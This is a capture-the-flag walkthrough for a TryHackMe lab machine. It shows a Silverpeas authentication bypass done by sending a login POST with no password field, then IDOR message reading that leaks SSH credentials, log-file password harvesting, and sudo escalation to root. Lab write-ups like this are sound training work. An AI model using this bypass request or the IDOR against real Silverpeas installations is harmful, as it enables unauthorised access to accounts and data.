---
tags:
  - THM
  - Linux
  - Easy
  - Auth-Bypass
  - IDOR
  - Leakage
  - Sudo
---
https://tryhackme.com/room/silverplatter/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.207.117 silver.thm
```
# Scanning
```console
$ nmap -p22,80,8080 -sV -sC silver.thm

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
|_http-title: Error
```
# Discovery
Found `scr1ptkiddy` username and [silverpeas/](http://silver.thm:8080/silverpeas/) directory by using information from the [contact](http://silver.thm/#contact) section running on port 80:
```text
If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
```
The [Silverpeas](https://www.silverpeas.org/) login panel running on port 8080 is from 2022:
```console
$ curl -s http://silver.thm:8080/silverpeas/defaultLogin.jsp | html2text --ignore-links | tail -n 2

(C) 2001-2022 Silverpeas \- All rights reserved
```
# Exploitation
## Authentication bypass
The application is likely vulnerable to [CVE-2024-36042](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d), so remove the password field from the POST request to log in as `scr1ptkiddy`:
```http
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: silver.thm:8080
Content-Type: application/x-www-form-urlencoded
Origin: http://silver.thm:8080

Login=scr1ptkiddy&DomainId=0
```
## Reading messages
Found **SSH credentials** of **user tim** in a message sent by the administrator. The message is read by changing the `ID` parameter as explained in [CVE-2023-47323](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323) at http://silver.thm:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6:
```text
Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 

Username: tim

Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```
Log in as **user tim** via SSH:
```bash
ssh tim@silver.thm
```
Read the **user flag**:
```bash
cat /home/tim/user.txt
```
# Post-Exploitation
## User migration
Found **user tyler**:
```console
$ grep sh$ /etc/passwd

root:x:0:0:root:/root:/bin/bash
tyler:x:1000:1000:root:/home/tyler:/bin/bash
tim:x:1001:1001::/home/tim:/bin/bash
```
We can read many **system log files** since we are in the **adm group**:
```console
$ id

uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```
Found **password** `_Zd_zx7N823/` for **user tyler** in the **system logs**:
```console
$ grep -i pass /var/log/auth.log* 2>/dev/null

/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
/var/log/auth.log.2:Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
```
Become **user tyler**:
```console
$ whoami
tim

$ su tyler
Password: _Zd_zx7N823/

$ whoami
tyler
```
## Privilege escalation
**User tyler** has full **sudo privileges**:
```console
$ sudo -l

Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```
Become **user root**:
```console
$ sudo su

# whoami
root
```
Read the **root flag**:
```bash
cat /root/root.txt
```